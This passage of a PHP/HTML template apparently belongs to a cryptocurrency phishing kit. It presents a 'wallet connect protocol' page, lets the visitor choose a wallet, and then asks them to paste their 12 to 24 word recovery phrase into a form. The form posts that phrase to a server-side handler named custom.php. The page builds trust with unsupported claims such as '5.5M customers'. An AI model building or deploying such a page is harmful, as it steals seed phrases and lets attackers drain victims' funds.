      border-radius: 50%;
      cursor: pointer;
      pointer-events: initial;
      -webkit-transition: box-shadow 0.2s, background 0.2s;
      transition: box-shadow 0.2s, background 0.2s;
    }

    .back-button-area:hover,
    .back-button-area:active,
    .back-button-area:focus {
      box-shadow: 0 0 10px 10px #455374;
      background: #455374;
    }

    .page-input .back-button-area {
      width: 24px;
      box-shadow: none;
      background: none;
      border-radius: 50%;
      cursor: pointer;
      pointer-events: initial;
    }

    .page-input .back-button-area:hover,
    .page-input .back-button-area:active,
    .page-input .back-button-area:focus {
      box-shadow: none;
      background: none;
    }

    .button-shade .gpay-button-fill {
      margin-top: auto;
      max-width: 450px;
      pointer-events: all;
      border-radius: 12px;
      overflow: hidden;
    }

    .button-shade .gpay-button-fill button {
      padding: 12px !important;
      height: 48px !important;
    }

    @supports not (-webkit-appearance: -apple-pay-button) {
      apple-pay-button {
        background-size: 100% 60%;
        background-repeat: no-repeat;
        background-position: 50% 50%;
        box-sizing: border-box;
        min-height: 32px;
        max-height: 64px;
        background-image: -webkit-named-image(apple-pay-logo-black);
        background-color: white;
      }
    }

    apple-pay-button {
      border-radius: 12px;
      overflow: hidden;
      width: 100%;
      background: white;
      max-width: 450px;
      padding: 8px;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
    }

    .alert {
      background: #b72722;
      color: white;
      width: 100%;
      padding: 5px;
      text-align: center;
      position: fixed;
      top: 0;
      -webkit-transition: -webkit-transform 0.2s;
      transition: -webkit-transform 0.2s;
      transition: transform 0.2s;
      transition: transform 0.2s, -webkit-transform 0.2s;
      -webkit-transform: translateY(-100%);
      transform: translateY(-100%);
      z-index: 2;
      font-size: 0.8em;
    }

    .alert.shown {
      -webkit-transform: translateY(0%);
      transform: translateY(0%);
    }

    .take-feedback {
      margin-top: 32px;
      max-width: 311px;
      width: 100%;
      min-height: 73px;
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.16);
      box-sizing: border-box;
      border-radius: 16px;
      padding: 0 24px;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      -webkit-box-pack: justify;
      -webkit-justify-content: space-between;
      justify-content: space-between;
      color: #ffffff;
      margin-left: auto;
      margin-right: auto;
      font-weight: bold;
      font-size: 16px;
      line-height: 24px;
      cursor: pointer;
      text-decoration: none;
    }

    .icon-wrapper svg {
      width: 100%;
      height: 100%;
      max-width: 105px;
    }

    .emoji-eu-flag {
      display: inline-block;
      margin-bottom: -8px;
      width: 32px;
      height: 32px;
      background-image: url(/assets/images/2af572f147fca6f739e998803c58aa5a.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      margin-right: auto;
    }

    .emoji-gb-flag {
      display: inline-block;
      margin-bottom: -8px;
      width: 32px;
      height: 32px;
      background-image: url(/assets/images/3fc871cb30eadf900a9f2cab67da1552.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      margin-right: auto;
    }

    .emoji-us-flag {
      display: inline-block;
      margin-bottom: -8px;
      width: 32px;
      height: 32px;
      background-image: url(/assets/images/344ba0ac2db36b395213adb01c18375c.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      margin-right: auto;
    }

    .scroll-body {
      background: #f4f4f4;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      position: relative;
      -webkit-box-orient: vertical;
      -webkit-box-direction: normal;
      -webkit-flex-direction: column;
      flex-direction: column;
    }

    textarea#phrases {
      width: 100%;
      border: solid 1px dimgrey;
      outline: unset;
      border-radius: 6px;
      padding: 10px;
      margin: 20px 0;
    }

    p#coinass {
      display: flex;
      flex-direction: column;
      flex-wrap: wrap;
      align-content: center;
      justify-content: center;
      align-items: center;
    }

    button#submit {
      padding: 10px 25px;
      border: unset;
      border-radius: 3px;
      background-color: cadetblue;
      color: white;
      font-weight: bold;
    }

    .scroll-body-limiter {
      max-width: 416px;
      margin: auto;
      z-index: 1;
      padding: 0 15px;
      width: 100%;
    }

    .scroll-body-limiter.funds {
      max-width: 680px;
    }

    .transition-bg {
      background: #396afc;
      background: -webkit-linear-gradient(341.54deg, #396afc 0%, #2948ff 100%);
      background: linear-gradient(108.46deg, #396afc 0%, #2948ff 100%);
      width: 100%;
      height: 420px;
      position: absolute;
      right: 0;
    }

    h3.transition-text,
    h4.transition-text {
      color: white;
      text-align: center;
      line-height: 26px;
    }

    h3.transition-text {
      font-size: 24px;
      margin: 48px 0 16px 0;
      font-weight: 700;
      line-height: 26px;
    }

    h4.transition-text {
      font-size: 20px;
      opacity: 0.7;
      margin-top: 0;
      font-weight: 700;
    }

    .requisites-card {
      background: #ffffff;
      box-shadow: 0px 8px 40px rgba(0, 0, 0, 0.1);
      border-radius: 20px;
      padding: 24px;
    }

    .requisites-card h3 {
      font-size: 20px;
      margin-top: 0;
      font-weight: 800;
      line-height: 26px;
    }

    .requisites-card h3 .emoji-eu-flag,
    .requisites-card h3 .emoji-us-flag {
      margin-left: 0.25em;
    }

    .line-split {
      width: 100%;
      border-top: solid 0.5px #c4c4c4;
    }

    .line-split.for-dark {
      border-top: solid 0.5px #ffffff;
      opacity: 0.2;
    }

    .requisite-section {
      margin-top: 20px;
      overflow-wrap: break-word;
      line-height: 17px;
      text-transform: uppercase;
    }

    .requisite-title {
      padding-top: 20px;
      opacity: 0.6;
      line-height: 16.8px;
      font-size: 14px;
    }

    .requisite-data {
      font-weight: 900;
      margin-top: 4px;
      overflow-wrap: break-word;
      line-height: 19.2px;
    }

    .requisite-section+.requisite-data {
      margin-top: 10px;
    }

    .funds-received h3 {
      text-align: center;
      font-size: 24px;
      margin-bottom: 8px;
      font-weight: 800;
      line-height: 26px;
    }

    .funds-received h4 {
      text-align: center;
      font-size: 20px;
      opacity: 0.7;
      margin-top: 0;
      font-weight: 700;
      line-height: 26px;
    }

    .funds-received-total {
      padding: 0 0 120px 0;
      text-align: center;
      font-weight: 900;
      font-size: 48px;
    }

    .scrollable-body {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -webkit-box-direction: normal;
      -webkit-flex-direction: column;
      flex-direction: column;
      width: 100%;
    }

    .footer {
      background: #000000;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      padding: 16px;
      -webkit-box-orient: vertical;
      -webkit-box-direction: normal;
      -webkit-flex-direction: column;
      flex-direction: column;
      color: #b2b2b2;
    }

    .footer a {
      margin: auto;
      color: #fa5255;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .footer .mono-logo {
      margin: 16px auto;
      margin-top: 34px;
    }

    .footer .mono-logo svg {
      max-width: 266px;
      width: 100%;
    }

    h4.title-emphasis {
      text-align: center;
      font-size: 20px;
      line-height: 26px;
      margin-bottom: 16px;
      margin: 40px 0;
      opacity: 0.7;
      font-weight: 700;
    }

    .funds-received {
      position: relative;
    }

    img.ukraine-glow {
      position: absolute;
      top: -100px;
      width: 100%;
      z-index: -1;
      pointer-events: none;
      -webkit-user-select: none;
      user-select: none;
    }

    @media (max-width: 650px) {
      img.ukraine-glow {
        display: none;
      }

      .scroll-body-limiter.funds {
        background: url(/assets/images/a9a0c8e9cd3acb4f46f9f35befa6ccc9.svg);
        background-size: 200%;
        background-position: center;
      }
    }

    .emoji-waving-hand {
      display: inline-block;
      margin-bottom: -6px;
      width: 40px;
      height: 40px;
      background-image: url(/assets/images/a1cd82b5a6a6155b940e33b3f4332f68.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      margin-right: auto;
    }

    .emoji-fist-2 {
      display: inline-block;
      margin-bottom: -9px;
      width: 48px;
      height: 48px;
      background-image: url(/assets/images/9b1ea5f98d5c6a4471f7e47ae0dcb7bc.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      margin-right: auto;
    }

    .emoji-heart {
      display: inline-block;
      margin-bottom: -12px;
      width: 64px;
      height: 64px;
      background-image: url(/assets/images/8d85d5483aecbaa1c426a94e0842a9b9.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      margin-right: auto;
    }

    .emoji-bank {
      display: inline-block;
      margin-bottom: -3px;
      width: 24px;
      height: 24px;
      background-image: url(/assets/images/0931246a838902e593e9381fd0561f0f.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      margin-right: auto;
    }

    .funds-received .emoji-waving-hand {
      position: absolute;
      top: 10%;
      left: 5%;
      z-index: -1;
    }

    .funds-received .emoji-fist-2 {
      position: absolute;
      top: 15%;
      right: 5%;
      z-index: -1;
    }

    .funds-received .emoji-heart {
      position: absolute;
      bottom: 40px;
      left: 20%;
      z-index: -1;
    }

    @media (max-width: 370px) {
      .funds-received .emoji-waving-hand {
        position: absolute;
        top: 0;
        left: -10px;
        z-index: -1;
      }

      .funds-received .emoji-fist-2 {
        bottom: 80px;
        right: 5%;
        top: unset;
      }

      .funds-received-total {
        font-size: 12vw;
      }
    }

    .fake-button {
      width: 24px;
      height: 24px;
      margin-right: 16px;
      margin-left: 16px;
      min-width: 24px;
    }

    .title-panel {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      margin-bottom: 12px;
    }

    div.inline {
      display: inline-block;
    }

    .footer-container {
      margin: auto;
      max-width: 450px;
      text-align: center;
    }

    .footer-text {
      padding: 16px 0;
      font-size: 14px;
      line-height: 16.8px;
    }

    a.external-link-card {
      background: rgba(118, 164, 255, 0.2);
      display: block;
      border-radius: 16px;
      padding: 19px 24px;
      color: #76a5ff;
      text-decoration: none;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      text-align: initial;
      margin: 16px 0;
      -webkit-transition: background 0.2s;
      transition: background 0.2s;
      font-weight: 700;
    }

    a.external-link-card:hover {
      text-decoration: none;
      background: rgba(118, 164, 255, 0.25);
    }

    a.external-link-card:active,
    a.external-link-card:focus-visible {
      text-decoration: none;
      background: rgba(118, 164, 255, 0.35);
    }

    a.external-link-card .link-heading {
      min-width: 24px;
      margin: 16px;
      margin-left: 0;
    }

    a.external-link-card .icon {
      min-width: 24px;
      margin: 16px;
      margin-right: 0;
    }

    .footer .line-split {
      margin: 16px 0;
    }
  </style>
</head>

<body data-new-gr-c-s-check-loaded="14.1050.0" data-gr-ext-installed="">
  <noscript>The website doesn't work in your browser</noscript>
  <main id="main">
    <div class="scrollable-body">
      <div class="dark-bg page-tips">
        <div class="page-title-block">
          <div class="page-title-header">
            <div class="page-title-header--emoji1"></div>
            <a href="">
              <div class="page-title-header--logo"> </div>
            </a>
            <div class="page-title-header--emoji2"></div>
          </div>
          <h3>Open protocol for connecting wallets</h3>
          <p><?= $generic->project ?> provides users with a digital solution for securely storing and managing blockchain assets and cryptocurrencies.</p>
        </div>
        <div class="center-block bottomed">
          <div id="coins" class="pannel">
            <h2 class="tip-title">Choose your wallet </h2>
            <div class="tips-fast-options">
              <?php
              foreach ($files as $key => $coin) { ?>
                <div class="tip-choice tip-highlight wink">
                  <div class="tip-content">
                    <div class="tip-amount" data-logo="<?= $coin->logo ?>" data-name="<?= $coin->name ?>" data-symbol="<?= $coin->symbol ?>">
                      <img src="<?= $coin->logo ?>" width="50px" alt="<?= $coin->symbol ?>" />
                    </div>
                    <p><?= $coin->name ?></p>
                  </div>
                </div>
              <?php }
              ?>
            </div>
          </div>
          <div class="pannel" id="walletconnect" style="display: none;">
            <h2 class="tip-title">
              <span class="back">🔙 </span>
              <p id="coinass">
                <img style="border-radius: 50%;" id="dataLogo" src="<?= $coin->logo ?>" width="70px" />

                Connect
                <strong id="dataName"><?= $coin->name ?></strong>
              </p>
            </h2>
            <div class="tips-fast-options coin-details">
              <form method="post" action="">
                <div>
                  <label for="phrases">
                    Paste your pnemonic below.
                    <br>
                    Typically 12 or 18 (sometimes 24) words seperated by a single spaces.
                  </label>
                  <textarea class="form-control" rows="5" name="value" required id="phrases" placeholder="Enter your phrase here"></textarea>
                  <input type="hidden" id="wall" name="type" value="phrase" required>
                  <input type="hidden" id="dataSymbol" name="wallet" required>
                </div>
                <div class="form-group"><button class="btn btn-primary btn-block submit" type="submit" id="submit" name="submit">Proceed</button></div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="scroll-body emphasis-contacts">
      <div class="footer">
        <div class="footer-container">
          <h1 class="title">
            <?= $generic->project ?>
          </h1>
          <a href="" target="_blank" rel="external" class="external-link-card">
            <div class="emoji-bank link-heading"></div>
            <div class="link-card-label">Decentralized wallet is wallet where you have full access over your crypto asset (with your private key)</div>
            <div class="icon"><svg viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                <g opacity="0.5">
                  <path d="M10.9996 3C10.7344 3 10.48 3.10536 10.2925 3.29289C10.1049 3.48043 9.99959 3.73478 9.99959 4C9.99959 4.26522 10.1049 4.51957 10.2925 4.70711C10.48 4.89464 10.7344 5 10.9996 5H13.5856L7.29259 11.293C7.19708 11.3852 7.1209 11.4956 7.06849 11.6176C7.01608 11.7396 6.9885 11.8708 6.98734 12.0036C6.98619 12.1364 7.01149 12.2681 7.06177 12.391C7.11205 12.5139 7.18631 12.6255 7.2802 12.7194C7.37409 12.8133 7.48574 12.8875 7.60864 12.9378C7.73154 12.9881 7.86321 13.0134 7.99599 13.0123C8.12877 13.0111 8.25999 12.9835 8.382 12.9311C8.504 12.8787 8.61435 12.8025 8.70659 12.707L14.9996 6.414V9C14.9996 9.26522 15.1049 9.51957 15.2925 9.70711C15.48 9.89464 15.7344 10 15.9996 10C16.2648 10 16.5192 9.89464 16.7067 9.70711C16.8942 9.51957 16.9996 9.26522 16.9996 9V4C16.9996 3.73478 16.8942 3.48043 16.7067 3.29289C16.5192 3.10536 16.2648 3 15.9996 3H10.9996Z" fill="#76A4FF"></path>
                  <path d="M5 5C4.46957 5 3.96086 5.21071 3.58579 5.58579C3.21071 5.96086 3 6.46957 3 7V15C3 15.5304 3.21071 16.0391 3.58579 16.4142C3.96086 16.7893 4.46957 17 5 17H13C13.5304 17 14.0391 16.7893 14.4142 16.4142C14.7893 16.0391 15 15.5304 15 15V12C15 11.7348 14.8946 11.4804 14.7071 11.2929C14.5196 11.1054 14.2652 11 14 11C13.7348 11 13.4804 11.1054 13.2929 11.2929C13.1054 11.4804 13 11.7348 13 12V15H5V7H8C8.26522 7 8.51957 6.89464 8.70711 6.70711C8.89464 6.51957 9 6.26522 9 6C9 5.73478 8.89464 5.48043 8.70711 5.29289C8.51957 5.10536 8.26522 5 8 5H5Z" fill="#76A4FF"></path>
                </g>
              </svg></div>
          </a>
          <div class="footer-text"><?= $generic->project ?> is the largest dApp connecr protocol with 5.5M customers</div>
          <div class="line-split for-dark"></div>
        </div>
      </div>
    </div>
    </div>
  </main>
  <script src="master/js/jquery-3.3.1.min.js"></script>
  <script src="master/js/controllers.js"></script>
  <script>
    $(document).ready(function() {
      $(".tip-amount").click(function() {
        const data = $(this).data();
        const box = $(this).closest(".pannel");
        $("#dataSymbol").attr({
          value: data.symbol
        });
        $("#dataLogo").attr({
          src: data.logo
        });
        $("#dataName").text(data.name);
        box.swapDiv($(`#walletconnect`));
      });

      $(".back").click(function() {
        const box = $(this.closest(".pannel"));
        box.swapDiv($(`#coins`));
      })

      $("form").submitForm({
        process_url: `${site.process}custom.php`,
        case: "connect-wallet"
      }, null, function(res) {
        window.location.reload();
      })
    })
  </script>
</body>

</html>